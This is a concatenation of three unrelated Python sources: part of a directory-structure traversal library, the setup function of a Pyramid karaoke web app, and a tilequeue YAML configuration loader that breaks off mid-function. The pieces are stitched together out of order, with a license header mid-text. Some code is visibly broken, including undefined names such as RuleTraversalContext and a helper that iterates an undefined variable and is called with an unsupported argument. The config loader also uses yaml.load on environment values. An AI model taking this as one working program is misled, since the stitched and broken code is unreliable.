PathTraversalContext = collections.namedtuple( "PathTraversalContext", ("attributes", "parameters", "path", "collections", "user", "group", "permissions") ) # includes attrs and params from current level                    
LevelTraversalContext = collections.namedtuple( "LevelTraversalContext", ( "bookmarks", "treeattributes", "localattributes", "parameter", "collection", "user", "group", "permissions" )) # elements of current level only



def _traverse( searcher, rule, ctx, client ):
  if searcher.does_intersect_rule( RuleTraversalContext( rule['bookmarks'], rule['attributes'], rule['parameters'] ) ):
    
    pathlist = [ctx]
    for leveltype, levelfields in rule[ 'levels' ]:
      
      # create new level context:
      levelbookmarks = levelfields['bookmarks'] if 'bookmarks' in levelfields else []
      leveltreeattr = levelfields['treeattributes'] if 'treeattributes' in levelfields else {}
      levellocalattr = levelfields['localattributes'] if 'localattributes' in levelfields else {}
      levelparameter = levelfields['key'] if 'key' in levelfields else None
      levelcollection = levelfields['collection'] if 'collection' in levelfields else None
      leveluser = levelfields['user'] if 'user' in levelfields else None
      levelgroup = levelfields['group'] if 'group' in levelfields else None
      levelpermissions = levelfields['permissions'] if 'permissions' in levelfields else None
      
      levelctx = LevelTraversalContext( levelbookmarks, leveltreeattr, levellocalattr, levelparameter, levelcollection, leveluser, levelgroup, levelpermissions )
      
      # get directories for this level
      ruletuples = FnLevel[ leveltype ].get_directories( levelctx, levelfields, searcher, pathlist, client )
      
      if not ruletuples:
        break # end for
      
      passedlist = []
      for ictx, dirname in ruletuples: # breadth-first search with pruning

        treeattr = ictx.attributes.copy() # shallow
        if 'treeattributes' in levelfields:
          treeattr.update( leveltreeattr )
          
        localattr = treeattr.copy() # shallow
        if 'localattributes' in levelfields:
          localattr.update( levellocalattr )
          
        parameters = ictx.parameters.copy() # shallow
        collections = ictx.collections.copy() # shallow
        if levelparameter :
          basename = os.path.basename( dirname )
          parameters[ levelparameter ] = basename
          if levelcollection:
            collections[ levelparameter ] = levelcollection
            
        user = attrexpr.eval_attribute_expr( leveluser, localattr, parameters ) if leveluser else ictx.user
        group = attrexpr.eval_attribute_expr( levelgroup, localattr, parameters ) if levelgroup else ictx.group
        permissions = ugoexpr.eval_ugo_expr( levelpermissions ) if levelpermissions else ictx.permissions
        
        newctx = PathTraversalContext( localattr, parameters, dirname, collections, user, group, permissions )
        test = searcher.does_intersect_path( newctx )
        if test:
          searcher.test( newctx, levelctx )
          newctx = PathTraversalContext( treeattr, parameters, dirname, collections, user, group, permissions ) # context that the children see & modify                    
          passedlist.append( newctx )
        
      pathlist = passedlist

  return

  
"""
a rule is a list of directory levels.
a compiled rule has:
   a set of bookmarks under it
   a set of parameters under it
   a set of attributes under it

Directory level types:
  fixed : one or more fixed names, not parameterized
     fields : bookmarks, local attrs, tree attrs, name
  branch : redirects to one or more other rules, IN ORDER, no special attributes of its own
     fields: rules
  parameterized : any number of parameterized directories, there is one key and potentially many values.
     fields : bookmarks, local attrs, tree attrs, key, collection,
     if there is an collection attribute, then the values are restricted.
     """

def compile_dir_structure( doc ):
    "returns a compiled version of the input document"
    ret ={ 'globals': {}, 'collections':{}, 'rules':{} }
    # copy globals:
    if 'globals' in doc:
      ret['globals'] = copy.deepcopy( doc['globals'] )
    # copy collections:
    if 'collections' in doc:
      ret['collections'] = copy.deepcopy( doc['collections'] )
    # copy rules:
    if 'rules' in doc:
      # a document rule is a key-value pair
      #    name of the rule is the key
      #    list of levels is the value.
      for rulename in doc['rules']:
        levellist = doc['rules'][rulename]
        ret['rules'][rulename] = {
          'levels' : copy.deepcopy( levellist ),
          'bookmarks' : tuple(get_rule_bookmarks(levellist, doc)),
          'parameters' : tuple(get_rule_parameters(levellist, doc)),
          'attributes' : tuple(get_rule_attributes(levellist, doc))
          }
    return ret

# -----------

#####################################################################
#
# Copyright 2015 Mayur Patel
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License. 
# 
#####################################################################

from . import pathexpr
from . import ds
from . import fs

# a compiledrule is a dictionary with fields:
#    "bookmarks": set of bookmarks (under it)
#    "parameters" : set of parameters (keys only) (under it) 
#    "attributes" : set of attributes (keys only) (under it)
#    "levels" : tuples of tuples, (( "leveltype", {<levelfields>}),( "leveltype", {<levelfields>}),etc)
#    as traversal occurs, the bookmarks, parameter, attributes move from rules to the contexts as they resolve.
#

#
# A searcher has :
# does_intersect_rule( self, rulectx ) return bool if the rule might contain our target
# does_intersect_path( self, pathctx ) returns bool if the path might contain our target
# test( self, pathctx, levelctx ) to detemine whether this level is our target
# do_existing_paths() : bool, are we traversing real directories on disk, or is this theoretical?
# get_parameters( self, key, levelctx, pathctxlist ) : if this is a theoretical traversal, then the searcher needs to supply possible values, for each parameter key, to advance the search.


  

class LocalClient( object ) :
  def __init__(self, compileddoc, startingpath ):
    self._doc = compileddoc
    self._root = startingpath

  def get_rule_names( self ):
    return self._doc['rules'].keys()
  
  def get_rule( self, rulename ): # advanced API, not necessarily public; returns compiled rule
    return self._doc['rules'][rulename] if rulename in self._doc['rules'] else None
  
  def get_collection_names( self ):
    return self._doc['collections'].keys()
  
  def get_collection( self, collectionname ) : 
    return self._doc['collections'][collectionname] if collectionname in self._doc['collections'] else None
  
  def get_global_names( self ):
    return self._doc['globals'].keys()
  
  def get_global( self, attrname ):
    return self._doc['globals'][attrname] if attrname in self._doc['globals'] else None

  def traverse( self, searcher ): # advanced API, not necessarily public
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    client = self
    return ds._traverse( searcher, rule, ctx, client )
  
  def get_bookmark_names( self ) :
    return self._doc['rules']['ROOT']['bookmarks']
  
  def get_bookmark_parameters( self, bookmark ):
    """returns the parameters required to find the bookmark.  A list of dictionaries.  Each dictionary is a set of parameters required to find the bookmark.  The key is the parameter name and the value determines which, if any, collection the parameter is associated with."""
    class SearcherBookmarks( object ):
      def __init__( self, dirstructure ) :
        self._store = []
        self._ds = dirstructure
      def does_intersect_rule( self, rulectx ):
        return bookmark in rulectx.bookmarks
      def does_intersect_path( self, pathctx ):
        return True
      def test( self, pathctx, levelctx ):
        if bookmark in levelctx.bookmarks:
          found = ( (x,None) if x not in pathctx.collections else (x,pathctx.collections[x]) for x in pathctx.parameters.keys() )
          self._store.append( dict(found) )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        if levelctx.collection:
          coll = self._ds.get_collection( levelctx.collection )
          return (coll[0],)
        else:
          return ('X',)
    searcher = SearcherBookmarks( self )
    ctx = ds.PathTraversalContext( {}, {}, '', {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def search_paths( self, searchexpr ):
    """implies a query, with a specific predicate or filter to narrow the search, returns only paths that exist"""
    searcher = pathexpr.SearcherExists( self, searchexpr )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def depict_paths( self, createexpr ):
    "this returns a not-exists path, but does not make a directory on disk"
    searcher = pathexpr.SearcherNotExists( self, createexpr )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store
  
  def get_path_context( self, targetpath ):
    "returns the path traversal context for the given path, works for real paths or depicted paths, will reject invalid paths, will accept paths deeper than what the structure knows about giving the deepest context it can"
    class SearcherPath( object ):
      def __init__( self, targetpath, client ) :
        self._splitpath = fs.split_path( targetpath )
        self._lensplitpath = len( self._splitpath )
        self._store = {} # this keeps matches, indexed by their depths
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        does_pass = self._splitpath[:lenpath] == testpath and lentestpath <= self._lensplitpath
        if does_pass and lentestpath not in self._store :
          # when we reach a new depth, we create a new entry in our storage
          self._store[lentestpath] = []
        return does_pass
      def test( self, pathctx, levelctx ):
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if self._splitpath[:lenpath] == testpath[:lenpath] :
          # store hits at the depth they occur:
          self._store[lenpath].append( pathctx )
      def do_existing_paths( self ) :
        return False
      def get_parameters( self, key, levelctx, pathctxlist ):
        # we get parameters from the path itself
        ret = set()
        for pathctx in pathctxlist :
          testpath = fs.split_path( pathctx.path )
          lenpath = len(testpath)
          if self._lensplitpath > lenpath:
            ret.add( self._splitpath[lenpath] )
        return ret
      
    searcher = SearcherPath( targetpath, self )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )
    ret = ctx if targetpath == self._root else None
    if searcher._store :
      # all depths in the traversal needed to have a match, otherwise the path was not valid for the directory structure:
      if all( searcher._store[i] for i in searcher._store ):
        # we want to return the deepest match:
        key = max( searcher._store.keys() )
        assert 1 == len(searcher._store[key]), "Multiple targets found for single path (%s)" % targetpath
        ret = searcher._store[key][0]
    return ret

  def get_frontier_contexts( self, targetpath ):
    """given an existing path, returns the 'next' parameter to be defined, as well as the paths to which that parameter leads.
    necessary for UI development.
    returns a dictionary where the key is the parameter name, and the value is the list of directories associated with that parameter
    
    """
    """
    
    implementation details:
    set of parameters:
    calculate extra parameters
    calculate missing parameters
    if there are missing parameters, then cull the search
    if there is one extra parameter, then add it to the hits
    if there is zero extra parameters, then continue
    if there is more than one extra parameters, then cull the search
    
    """
    class SearcherPath( object ):
      def __init__( self, targetctx, client ) :
        self._splitpath = fs.split_path( targetctx.path )
        self._targetparam = set( targetctx.parameters.keys() )
        self._lensplitpath = len( self._splitpath )
        self._store = {}
        self._ds = client
      def does_intersect_rule( self, rulectx ):
        return True
      def does_intersect_path( self, pathctx ):
        testpath = fs.split_path( pathctx.path )
        lentestpath = len(testpath)
        lenpath = min( self._lensplitpath, lentestpath )
        extra_count = len( set( pathctx.parameters.keys() ) - self._targetparam )
        return self._splitpath[:lenpath] == testpath[:lenpath] and extra_count < 2
      def test( self, pathctx, levelctx ):
        path_set = set( pathctx.parameters.keys() )
        extra_param = path_set - self._targetparam
        extra_count = len( extra_param )
        missing_count = len( self._targetparam - path_set )
        testpath = fs.split_path( pathctx.path )
        lenpath = min( self._lensplitpath, len(testpath))
        if extra_count == 1 and ( not missing_count ) and levelctx.parameter:
          key = extra_param.pop()
          if not key in self._store:
            self._store[key] = []
          self._store[key].append( pathctx )
      def do_existing_paths( self ) :
        return True
      def get_parameters( self, key, levelctx, pathctxlist ):
        return None

    targetctx = self.get_path_context( targetpath )
    searcher = SearcherPath( targetctx, self )
    ctx = ds.PathTraversalContext( {}, {}, self._root, {}, None, None, None )
    rule = self._doc[ 'rules' ][ 'ROOT' ]
    ds._traverse( searcher, rule, ctx, self )  
    return searcher._store

      

import os
import re
import operator
from functools import partial

# Pyramid imports
import pyramid.events
import pyramid.request
import pyramid.config
from pyramid.session import SignedCookieSessionFactory  # TODO: should needs to be replaced with an encrypted cookie or a hacker at an event may be able to intercept other users id's
from pyramid.i18n import get_localizer, TranslationStringFactory

# External Imports
from externals.lib.misc import convert_str_with_type, read_json, extract_subkeys, json_serializer, file_scan
from externals.lib.pyramid_helpers.auto_format2 import setup_pyramid_autoformater
from externals.lib.pyramid_helpers.session_identity2 import session_identity
from externals.lib.social._login import NullLoginProvider, FacebookLogin, GoogleLogin
from externals.lib.multisocket.auth_echo_server import AuthEchoServerManager

# Package Imports
from .traversal import TraversalGlobalRootFactory
from .templates import helpers as template_helpers
from .auth import ComunityUserStore, NullComunityUserStore
# SQLAlchemy imports
from .model import init_DBSession


import logging
log = logging.getLogger(__name__)

translation_string_factory = TranslationStringFactory('karakara')


def main(global_config, **settings):
    """
        This function returns a Pyramid WSGI application.
    """
    # Setup --------------------------------------------------------------------

    # Db
    init_DBSession(settings)

    # Pyramid Global Settings
    config = pyramid.config.Configurator(settings=settings, root_factory=TraversalGlobalRootFactory)  # , autocommit=True

    def assert_settings_keys(keys):
        for settings_key in key:
            assert config.registry.settings.get(settings_key)

    # Register Additional Includes ---------------------------------------------
    config.include('pyramid_mako')  # The mako.directories value is updated in the scan for addons. We trigger the import here to include the correct folders.

    # Reload on template change - Dedicated from pserve
    #template_filenames = map(operator.attrgetter('absolute'), file_scan(config.registry.settings['mako.directories']))
    #from pyramid.scripts.pserve import add_file_callback
    #add_file_callback(lambda: template_filenames)

    # Parse/Convert setting keys that have specified datatypes
    # Environment variables; capitalized and separated by underscores can override a settings key.
    # e.g.
    #   export KARAKARA_TEMPLATE_TITLE=Test
    #   can override 'karakara.template.title'
    for key in config.registry.settings.keys():
        value = os.getenv(key.replace('.', '_').upper(), '') or config.registry.settings[key]
        config.registry.settings[key] = convert_str_with_type(value)

    config.add_request_method(partial(session_identity, session_keys={'id', 'admin', 'faves', 'user'}), 'session_identity', reify=True)

    setup_pyramid_autoformater(config)

    # i18n
    config.add_translation_dirs(config.registry.settings['i18n.translation_dirs'])

    # Session Manager
    session_settings = extract_subkeys(config.registry.settings, 'session.')
    session_factory = SignedCookieSessionFactory(serializer=json_serializer, **session_settings)
    config.set_session_factory(session_factory)

    # Cachebust etags ----------------------------------------------------------
    #  crude implementation; count the number of tags in db, if thats changed, the etags will invalidate
    if not config.registry.settings['server.etag.cache_buster']:
        from .model.actions import last_update
        config.registry.settings['server.etag.cache_buster'] = 'last_update:{0}'.format(str(last_update()))

    # Search Config ------------------------------------------------------------
    import karakara.views.search
    karakara.views.search.search_config = read_json(config.registry.settings['karakara.search.view.config'])
    assert karakara.views.search.search_config, 'search_config data required'

    # WebSocket ----------------------------------------------------------------

    class NullAuthEchoServerManager(object):
        def recv(self, *args, **kwargs):
            pass
    socket_manager = NullAuthEchoServerManager()

    if config.registry.settings.get('karakara.websocket.port'):
        def authenticator(key):
            """Only admin authenticated keys can connect to the websocket"""
            request = pyramid.request.Request({'HTTP_COOKIE':'{0}={1}'.format(config.registry.settings['session.cookie_name'],key)})
            session_data = session_factory(request)
            return session_data and session_data.get('admin')
        try:
            _socket_manager = AuthEchoServerManager(
                authenticator=authenticator,
                websocket_port=config.registry.settings['karakara.websocket.port'],
                tcp_port=config.registry.settings.get('karakara.tcp.port'),
            )
            _socket_manager.start()
            socket_manager = _socket_manager
        except OSError:
            log.warn('Unable to setup websocket')

    config.registry['socket_manager'] = socket_manager


    # Login Providers ----------------------------------------------------------

    from .views.comunity_login import social_login
    social_login.user_store = ComunityUserStore()
    login_providers = config.registry.settings.get('login.provider.enabled')
    # Facebook
    if 'facebook' in login_providers:
        assert_settings_keys(
            ('login.facebook.appid', 'login.facebook.secret'),
            message='To use facebook as a login provider appid and secret must be provided'
        )
        social_login.add_login_provider(FacebookLogin(
            appid=config.registry.settings.get('login.facebook.appid'),
            secret=config.registry.settings.get('login.facebook.secret'),
            permissions=config.registry.settings.get('login.facebook.permissions'),
        ))
    # Google
    if 'google' in login_providers:
        social_login.add_login_provider(GoogleLogin(
            client_secret_file=config.registry.settings.get('login.google.client_secret_file'),
        ))
    # Firefox Persona (Deprecated technology but a useful reference)
    #if 'persona' in login_providers:
    #    social_login.add_login_provider(PersonaLogin(
    #        site_url=config.registry.settings.get('server.url')
    #    ))
    # No login provider
    if not login_providers and config.registry.settings.get('karakara.server.mode') == 'development':
        # Auto login if no service keys are provided
        social_login.add_login_provider(NullLoginProvider())
        social_login.user_store = NullComunityUserStore()
    template_helpers.javascript_inline['comunity'] = social_login.html_includes

    # Renderers ----------------------------------------------------------------

    # AllanC - currently the auto_format decorator does all the formatting work
    #          it would be far preferable to use the pyramid renderer framework
    #          issue is, we want to set the renderer to be dynamic based on the url given
    #          I don't want to define EVERY method with loads of renderer tags
    #          and I don't want to define 5+ routes for every view callable with differnt formats
    #          We need a nice way of doing this in pyramid, and right now, after HOURS of trawling
    #          the doc and experimenting, I cant find one.
    #from .renderers.auto_render_factory import AutoRendererFactory, handle_before_render
    #config.add_renderer(None   , AutoRendererFactory) #'renderers.auto_render_factory.auto_renderer_factory'
    #config.add_renderer('.html', 'pyramid.mako_templating.renderer_factory')
    #config.add_subscriber(handle_before_render , pyramid.events.BeforeRender) # maybe use this to set renderer?
    # closeset ive seen
    #   http://zhuoqiang.me/a/restful-pyramid
    #   http://stackoverflow.com/questions/4633320/is-there-a-better-way-to-switch-between-html-and-json-output-in-pyramid


    # Routes -------------------------------------------------------------------

    def settings_path(key):
        path = os.path.join(os.getcwd(), config.registry.settings[key])
        if not os.path.isdir(path):
            log.error(f'Unable to add_static_view {key}:{path}')
        return path

    # Static Routes
    config.add_static_view(name='ext', path=settings_path('static.externals'))  # cache_max_age=3600
    config.add_static_view(name='static', path=settings_path('static.assets'))  # cache_max_age=3600
    config.add_static_view(name='player', path=settings_path('static.player'))

    # AllanC - it's official ... static route setup and generation is a mess in pyramid
    #config.add_static_view(name=settings["static.media" ], path="karakara:media" )
    config.add_static_view(name='files', path=config.registry.settings['static.processmedia2.config']['path_processed'])

    # Routes
    def append_format_pattern(route):
        return re.sub(r'{(.*)}', r'{\1:[^/\.]+}', route) #+ r'{spacer:[.]?}{format:(%s)?}' % '|'.join(registered_formats())

    #config.add_route('home'          , append_format_pattern('/')              )
    #config.add_route('track'         , append_format_pattern('/track/{id}')    )
    #config.add_route('track_list'    , append_format_pattern('/track_list')    )
    config.add_route('track_import'  , append_format_pattern('/track_import')  )
    config.add_route('queue'         , append_format_pattern('/queue')         )                    
    config.add_route('priority_tokens', append_format_pattern('/priority_tokens'))
    config.add_route('fave'          , append_format_pattern('/fave')          )
    config.add_route('message'       , append_format_pattern('/message')          )
    config.add_route('admin_toggle'  , append_format_pattern('/admin')         )
    config.add_route('admin_lock'    , append_format_pattern('/admin_lock')    )
    config.add_route('remote'        , append_format_pattern('/remote')        )
    config.add_route('feedback'      , append_format_pattern('/feedback')      )
    config.add_route('settings'      , append_format_pattern('/settings')      )
    config.add_route('random_images' , append_format_pattern('/random_images') )
    config.add_route('inject_testdata' , append_format_pattern('/inject_testdata') )
    config.add_route('stats'         , append_format_pattern('/stats')         )
    config.add_route('comunity'      , append_format_pattern('/comunity')      )
    config.add_route('comunity_login', append_format_pattern('/comunity/login'))
    config.add_route('comunity_logout', append_format_pattern('/comunity/logout'))
    config.add_route('comunity_list' , append_format_pattern('/comunity/list') )
    config.add_route('comunity_track', append_format_pattern('/comunity/track/{id}'))
    config.add_route('comunity_upload', append_format_pattern('/comunity/upload'))
    config.add_route('comunity_settings', append_format_pattern('/comunity/settings'))
    config.add_route('comunity_processmedia_log', append_format_pattern('/comunity/processmedia_log'))

    config.add_route('search_tags'   , '/search_tags/{tags:.*}')
    config.add_route('search_list'   , '/search_list/{tags:.*}')

    # Upload extras -----
    #config.add_static_view(name=settings['upload.route.uploaded'], path=settings['upload.path'])  # the 'upload' route above always matchs first
    config.add_route('upload', '/upload{sep:/?}{name:.*}')

    # Events -------------------------------------------------------------------
    config.add_subscriber(add_localizer_to_request, pyramid.events.NewRequest)
    config.add_subscriber(add_render_globals_to_template, pyramid.events.BeforeRender)

    # Return -------------------------------------------------------------------
    config.scan(ignore='.tests')
    config.scan('externals.lib.pyramid_helpers.views')
    return config.make_wsgi_app()


def add_localizer_to_request(event):
    request = event.request
    localizer = get_localizer(request)
    def auto_translate(*args, **kwargs):
        return localizer.translate(translation_string_factory(*args, **kwargs))
    request.localizer = localizer
    request.translate = auto_translate


def add_render_globals_to_template(event):
    request = event['request']
    event['_'] = request.translate
    event['localizer'] = request.localizer
    event['h'] = template_helpers

from tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            "Expecting postgresql 'dbnames' to be a list"
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container, rest, value)                    

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """

    return s.lower().replace("_", "-")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
